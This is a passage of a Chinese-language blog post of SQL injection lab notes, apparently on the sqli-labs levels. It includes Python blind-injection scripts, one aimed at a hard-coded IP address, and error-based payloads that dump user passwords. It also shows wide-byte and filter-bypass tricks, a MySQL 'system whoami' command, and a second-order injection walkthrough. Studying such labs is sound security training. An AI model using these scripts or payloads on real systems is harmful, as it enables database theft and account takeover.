%i</span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        if sec &gt;= 2:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(i)</span><br><span class="line">            break</span><br><span class="line">    print(&#x27;database_len:&#x27;, i)</span><br><span class="line">    return i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def database_name(len):</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, len + 1):</span><br><span class="line">        for j in &#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;:</span><br><span class="line">            #payload = &#x27;?id=1&quot; and if(substr(database(),%d,1)=&quot;%s&quot;,sleep(3),1) --+&#x27; % (i, j)</span><br><span class="line">            payload = &quot;?id=1&#x27; and if(substr(database(),%d,1)=&#x27;%s&#x27;,sleep(3),1) --+&quot; % (i,j)</span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            if sec &gt;= 3:</span><br><span class="line">                name += j</span><br><span class="line">                print(name)</span><br><span class="line">                break</span><br><span class="line">    print(&#x27;database_name:&#x27;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def table_name():</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for k in range(6):</span><br><span class="line">        for i in range(10):</span><br><span class="line">            for j in range(65, 123):</span><br><span class="line">                #payload = &#x27;?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+&#x27; % (k, i, j)</span><br><span class="line">                payload = &quot;?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+&quot; % (k, i, j)</span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                if sec &gt;= 3:</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    print(chr(j))</span><br><span class="line">                    break</span><br><span class="line">        print(&quot;table_name:&quot;, name)</span><br><span class="line">        name = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def colum_name(table_name):</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for k in range(6):</span><br><span class="line">        for i in range(10):</span><br><span class="line">            for j in range(65, 123):</span><br><span class="line">                #payload = &#x27;?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; and table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+&#x27; % (table_name, k, i, j)</span><br><span class="line">                payload = &quot;?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+&quot; % (table_name, k, i, j)</span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                if sec &gt;= 3:</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    print(chr(j))</span><br><span class="line">                    break</span><br><span class="line">        print(&quot;column_name:&quot;, name)</span><br><span class="line">        name = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def data(column, table):</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for k in range(6):</span><br><span class="line">        for i in range(1, 10):</span><br><span class="line">            for j in range(48, 123):</span><br><span class="line">                #payload = &#x27;?id=1&quot; and if(ascii(substr((select %s from %s limit %d,1),%d,1))=%d, sleep(2),0)--+&#x27; % (column, table, k, i, j)</span><br><span class="line">                payload = &quot;?id=1&#x27; and if(ascii(substr((select %s from %s limit %d,1),%d,1))=%d, sleep(2),0)--+&quot; % (column,table,k,i,j)</span><br><span class="line">                time1 = datetime.datetime.now()</span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                time2 = datetime.datetime.now()</span><br><span class="line">                sec = (time2 - time1).seconds</span><br><span class="line">                if sec &gt;= 2:</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    print(chr(j))</span><br><span class="line">                    break</span><br><span class="line">        print(&quot;data:&quot;, name)</span><br><span class="line">        name = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    #len = database_len()</span><br><span class="line">    #database_name(len)</span><br><span class="line">    #table_name()</span><br><span class="line">    #colum_name(&#x27;emails&#x27;)</span><br><span class="line">    data(&#x27;列名&#x27;,&#x27;表名&#x27;)</span><br></pre></td></tr></table></figure>



<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p>输入1‘报错</p>
<p><img src="/.io//image-20250523223020272-1754809764536-34.png" alt="image-20250523223020272"></p>
<p>1’ or 1&#x3D;1#</p>
<p>1”报错</p>
<p><img src="/.io//image-20250528212134270-1754809764536-37.png" alt="image-20250528212134270"></p>
<p>可以知道sql语句是双引号且有括号。接着跟get做法一样</p>
<p>post布尔</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标URL</span><br><span class="line">url = &#x27;http://8.130.67.146:8081/Less-15/&#x27;</span><br><span class="line"></span><br><span class="line"># 请求参数模板</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;uname&quot;: &quot;&quot;,</span><br><span class="line">    &quot;passwd&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检测响应是否成功 (根据实际场景调整)</span><br><span class="line">def check_success(response):</span><br><span class="line">    return &#x27;../images/flag.jpg&#x27; in response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 通用爆破函数</span><br><span class="line">def exploit_sql(sql_query):</span><br><span class="line">    # 爆破长度</span><br><span class="line">    def get_length(sql):</span><br><span class="line">        for length in range(1, 101):  # 限制最大长度为100</span><br><span class="line">            payload = f&quot;a&#x27; or length((&#123;sql&#125;))=&#123;length&#125; -- a&quot;</span><br><span class="line">            data[&quot;uname&quot;] = payload</span><br><span class="line">            response = requests.post(url, data=data)</span><br><span class="line">            if check_success(response):</span><br><span class="line">                print(f&quot;长度爆破成功: &#123;length&#125;&quot;)</span><br><span class="line">                return length</span><br><span class="line">            print(f&quot;正在测试长度: &#123;length&#125;&quot;)</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">    # 爆破字符串内容</span><br><span class="line">    def get_string(sql, length):</span><br><span class="line">        result = &quot;&quot;</span><br><span class="line">        for i in range(1, length + 1):</span><br><span class="line">            for char_code in range(32, 127):  # 可打印字符范围</span><br><span class="line">                payload = f&quot;a&#x27; or ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))=&#123;char_code&#125; -- a&quot;</span><br><span class="line">                data[&quot;uname&quot;] = payload</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">                if check_success(response):</span><br><span class="line">                    result += chr(char_code)</span><br><span class="line">                    print(f&quot;进度: &#123;result&#125;&quot;)</span><br><span class="line">                    break</span><br><span class="line">            else:  # 未找到字符时添加占位符</span><br><span class="line">                result += &quot;?&quot;</span><br><span class="line">                print(f&quot;第&#123;i&#125;位字符爆破失败&quot;)</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    # 执行爆破</span><br><span class="line">    length = get_length(sql_query)</span><br><span class="line">    if length == 0:</span><br><span class="line">        print(&quot;爆破失败: 未获取到有效长度&quot;)</span><br><span class="line">        return &quot;&quot;</span><br><span class="line">    print(f&quot;开始爆破内容，长度: &#123;length&#125;&quot;)</span><br><span class="line">    return get_string(sql_query, length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 主功能菜单</span><br><span class="line">def main():</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;\n&quot; + &quot;=&quot; * 50)</span><br><span class="line">        print(&quot;SQL盲注自动化工具&quot;)</span><br><span class="line">        print(&quot;1. 爆破当前数据库名&quot;)</span><br><span class="line">        print(&quot;2. 爆破所有数据库名&quot;)</span><br><span class="line">        print(&quot;3. 爆破指定库的所有表名&quot;)</span><br><span class="line">        print(&quot;4. 爆破指定表的列名&quot;)</span><br><span class="line">        print(&quot;5. 自定义SQL查询&quot;)</span><br><span class="line">        print(&quot;0. 退出&quot;)</span><br><span class="line"></span><br><span class="line">        choice = input(&quot;请选择操作: &quot;).strip()</span><br><span class="line"></span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            # 爆破当前数据库</span><br><span class="line">            db_name = exploit_sql(&quot;database()&quot;)</span><br><span class="line">            print(f&quot;\n[+] 当前数据库: &#123;db_name&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            # 爆破所有数据库</span><br><span class="line">            sql = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line">            dbs = exploit_sql(sql)</span><br><span class="line">            print(f&quot;\n[+] 所有数据库: &#123;dbs&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            # 爆破指定库的表</span><br><span class="line">            db = input(&quot;请输入数据库名: &quot;).strip()</span><br><span class="line">            sql = f&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&#123;db&#125;&#x27;&quot;</span><br><span class="line">            tables = exploit_sql(sql)</span><br><span class="line">            print(f&quot;\n[+] 数据库 &#123;db&#125; 的所有表: &#123;tables&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        elif choice == &quot;4&quot;:</span><br><span class="line">            # 爆破指定表的列</span><br><span class="line">            db = input(&quot;请输入数据库名: &quot;).strip()</span><br><span class="line">            table = input(&quot;请输入表名: &quot;).strip()</span><br><span class="line">            sql = f&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&#123;db&#125;&#x27; and table_name=&#x27;&#123;table&#125;&#x27;&quot;</span><br><span class="line">            columns = exploit_sql(sql)</span><br><span class="line">            print(f&quot;\n[+] 表 &#123;table&#125; 的所有列: &#123;columns&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        elif choice == &quot;5&quot;:</span><br><span class="line">            # 自定义SQL</span><br><span class="line">            sql = input(&quot;请输入SQL查询语句: &quot;).strip()</span><br><span class="line">            result = exploit_sql(sql)</span><br><span class="line">            print(f&quot;\n[+] 查询结果: &#123;result&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        elif choice == &quot;0&quot;:</span><br><span class="line">            print(&quot;程序退出&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            print(&quot;无效选择，请重新输入&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> //最后select group_concat(id) from emails</span><br></pre></td></tr></table></figure>

<h3 id="密码重置页面"><a href="#密码重置页面" class="headerlink" title="密码重置页面"></a>密码重置页面</h3><p>第十七关和前面的关有很大不一样，根据页面展示是一个密码重置页面，也就是说我们已经登录系统了，然后查看我们源码，是根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改成你输入的密码。再执行这条sql语句之前会对输入的账户名进行检查，对输入的特殊字符转义。所以我们能够利用的只有更新密码的sql语句。sql语句之前都是查询，这里有一个update更新数据库里面信息。所以之前的联合注入和布尔盲注以及时间盲注都不能用了。这里我们会用到报错注入。用到三种mysql报错注入，下面都给大家详细写出步骤,大家可以借鉴。</p>
<p>我们切换下思路，之前我们的用户名字段都是随便输入的，现在我们写上一个已知的用户名 admin 再次注入。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=admin&amp;passwd=a<span class="string">&#x27;&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250529213227542-1754809764536-35.png" alt="image-20250529213227542"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">admin&#x27;and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;emails&#x27;)))#</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">admin&#x27;and 1=extractvalue(1,concat(0x7e,(select group_concat(id,&#x27;~&#x27;,email_id) from emails)))#</span><br></pre></td></tr></table></figure>

<h3 id="post-union注入"><a href="#post-union注入" class="headerlink" title="post union注入"></a>post union注入</h3><p><img src="/.io//image-20250604214143648-1754809764536-36.png" alt="image-20250604214143648"></p>
<p><img src="/.io//image-20250604214157281-1754809764537-39.png" alt="image-20250604214157281"></p>
<h3 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h3><p><img src="/.io//image-20250529214753020-1754809764537-38.png" alt="image-20250529214753020"></p>
<p><img src="/.io//image-20250529214819182-1754809764537-40.png" alt="image-20250529214819182"></p>
<p><img src="/.io//image-20250529214827992-1754809764537-42.png" alt="image-20250529214827992"></p>
<p><img src="/.io//image-20250604214337425-1754809764537-43.png" alt="image-20250604214337425"></p>
<p> 大家可以自己报错注入方式进行注入，updatexml和extractvalue报错注入爆出来的数据长度是有限的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ,2, (extractvalue(1,concat(0x5c,(select group_concat(password,username) from users),0x5c)))#   爆账户密码。</span><br><span class="line">1&#x27;,2,updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#   爆账户密码。</span><br></pre></td></tr></table></figure>



<h3 id="referer注入"><a href="#referer注入" class="headerlink" title="referer注入"></a>referer注入</h3><p><img src="/.io//image-20250529214956922-1754809764537-44.png" alt="image-20250529214956922"></p>
<p><img src="/.io//image-20250529215005090-1754809764537-46.png" alt="image-20250529215005090"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;,updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#</span><br></pre></td></tr></table></figure>

<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p><img src="/.io//image-20250529215046416-1754809764537-45.png" alt="image-20250529215046416"></p>
<p><img src="/.io//202409021207439-1754809764537-47.png" alt="image-20240902120739654"></p>
<p><img src="/.io//image-20250529215113421-1754809764537-48.png" alt="image-20250529215113421"></p>
<p>第二十关当我们输入正确页面时候cookie字段显示在页面上，进行抓包。进行注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#</span><br></pre></td></tr></table></figure>

<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节是相对于ascII这样单字节而言的；像 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节<br>GBK 是一种多字符的编码，通常来说，一个 gbk 编码汉字，占用2个字节。一个 utf-8 编码的汉字，占用3个字节<br>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string 等，还有一种是配置magic_quote_gpc，不过 PHP 高版本已经移除此功能。<br><strong>宽字节注入指的是 mysql 数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为’，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。</strong><br>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码<br>以下是数据的变化过程:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%df%27===&gt;(addslashes)===&gt;%df%5c%27 ===&gt;   (GBK)    ==&gt;運’</span><br><span class="line">用户输入===&gt;   过滤函数  ===&gt;代码层的$sql===&gt;mysql处理请求==&gt;mysql中的sql</span><br></pre></td></tr></table></figure>

<h4 id="常用函数或命令"><a href="#常用函数或命令" class="headerlink" title="常用函数或命令"></a><strong>常用函数或命令</strong></h4><p>show<br>查看当前数据库或者表名列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases</span><br><span class="line">show tables</span><br><span class="line">show columns from tablename</span><br></pre></td></tr></table></figure>

<p>查看版本等相关信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE variable_name LIKE &#x27;version%&#x27;</span><br></pre></td></tr></table></figure>

<p>查看数据目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;datadir&#x27;;</span><br></pre></td></tr></table></figure>

<p>查看所有的引擎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show engines;</span><br></pre></td></tr></table></figure>

<p>或者是进入到information_schama里面去查看ENGINES表<br>查看当前用的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show full processlist;</span><br></pre></td></tr></table></figure>

<p>查看所有的环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show variables;</span><br></pre></td></tr></table></figure>

<p>查看可读写路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line"></span><br><span class="line">SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;;</span><br></pre></td></tr></table></figure>

<p>ignore用法</p>
<p>当在执行命令中插入ignore的时候，当插入主键重复的时候也是不会报错的。</p>
<p>“Show databases \p;”</p>
<p>或者直接”\p”，参数\p打印出所执行的语句。PS（help中的参数格式都如同\p一样）</p>
<p>显示数据库创建，或者表创建的语言</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show create 数据库/表</span><br></pre></td></tr></table></figure>

<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>从文件里读取sql命令并执行，加入这里有一个a.sql文件，内容是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use test;select * from ctf;</span><br></pre></td></tr></table></figure>

<p>然后再mysql命令行里使用source a.sql;然后就会自动执行里面的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; source C:\Users\13664\Desktop\a.sql</span><br><span class="line">Database changed</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">| id   | flag                                          |</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">|    1 | wllmctf&#123;62c2d8b7-30de-ea38-e11b-7d7b42320a7d&#125; |</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>也可以导入数据库文件。</p>
<h4 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h4><p>用十六进制编码绕过 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set@a=0x73656c65637420666c61672066726f6d20637466;</span><br><span class="line"></span><br><span class="line">prepare execsql from @a;</span><br><span class="line"></span><br><span class="line">execute execsql;</span><br></pre></td></tr></table></figure>

<p>prepare…from…是预处理语句，会进行编码转换。 execute用来执行由SQLPrepare创建的SQL语句。</p>
<h4 id="handler"><a href="#handler" class="headerlink" title="handler"></a><strong>handler</strong></h4><p>如过最重要的select被过滤了，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 打开一个表名为 tbl_name 的表的句柄</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line"># READ FIRST: 获取句柄的第一行</span><br><span class="line"># READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）</span><br><span class="line"># 最后一行执行之后再执行 READ NEXT 会返回一个空的结果</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">   </span><br><span class="line"># 关闭以打开的句柄</span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; handler ctf open;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler ctf read first;</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">| id   | flag                                          |</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">|    1 | wllmctf&#123;62c2d8b7-30de-ea38-e11b-7d7b42320a7d&#125; |</span><br><span class="line">+------+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="宽字节注入绕过"><a href="#宽字节注入绕过" class="headerlink" title="宽字节注入绕过"></a>宽字节注入绕过</h4><p><img src="/.io//202409021421992-1754809764537-49.png" alt="image-20240902142110909"></p>
<p>‘输入进去会变成&#x2F;’</p>
<p><img src="/.io//202409021419897-1754809764537-50.png" alt="image-20240902141920614"></p>
<p><img src="/.io//202409021419965-1754809764537-52.png" alt="image-20240902141944792"></p>
<p><img src="/.io//202409021419212-1754809764537-51.png" alt="image-20240902141900398"></p>
<p><strong>sql有waf：出红色字</strong></p>
<p><img src="/.io//202407282226129-1754809764537-53.png" alt="image-20240728222609023"></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>system    (!) Execute a system shell command</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system whoami</span><br><span class="line">\! whoami</span><br></pre></td></tr></table></figure>



<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>sql第24关，第二十四关有一个登录页面和注册页面还要一个修改密码页面，该关卡使用得是二次注入，因为登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义。这里我们利用的是注册页面，因为虽然存在函数对特殊字符进行转义，但只是在调用sql语句时候进行转义，当注册成功后账户密码存在到数据库的时候是没有转义的，以原本数据存入数据库的。当我们修改密码的时候，对于账户名是没有进行过滤的。</p>
<p>注入点在login_create.php中的username字段，注册用户名为admin’#<br>之后登录admin’#，username字段就赋值给了session中的username字段</p>
<p><img src="/.io//image-20250529220040034-1754809764537-54.png" alt="image-20250529220040034"></p>
<p>在password_change.php中$username是直接从session中取出的，也就是取出的username为admin’#,拼接到sql语句中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;123&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure>

<p>admin用户的密码就被修改为123</p>
<p>但是在这题中没有设置容器，大家都在使用一个数据库，密码也在不断的被人改动，所以会出现改完密码后无法登陆的情况，并且数据库定期修改所有用户密码，所以稳定登陆的方法是不断的发送修改密码的包，如果admin’#用户被注册，可以增加多个#</p>
<p>wp：</p>
<p>尝试注册一个用户： 用户：test1 密码：test1</p>
<p>登进去后，说可以修改密码，尝试更改用户test1的密码为tese2</p>
<p>从上面的情况中我们可以分析出：</p>
<blockquote>
<ul>
<li><strong>登录界面</strong>，具有登录功能，同时有<strong>忘记密码</strong>和<strong>注册</strong>的链接。</li>
<li><strong>注册界面</strong>，具有注册功能。</li>
<li><strong>忘记密码界面</strong>，返回一张图片</li>
<li><strong>修改密码界面</strong>，登陆成功后，1.显示用户名，2.可以重置密码，3.有<strong>登出</strong>的链接。</li>
<li><strong>登录失败界面</strong>，返回一张图片。</li>
</ul>
</blockquote>
<p><strong>综上，可推断出注入点在更改密码上</strong></p>
<p>分析下源文件：</p>
<p><img src="/.io//image-20250529220531180-1754809764537-57.png" alt="image-20250529220531180"></p>
<p>这三个文件与数据库进行交互，剩下的五个文件分别对应上述几个显示的界面。</p>
<p>代码审计：</p>
<p>这几个文件出现频率最高的代码是：</p>
<p>session_start()</p>
<blockquote>
<p>可参考php手册</p>
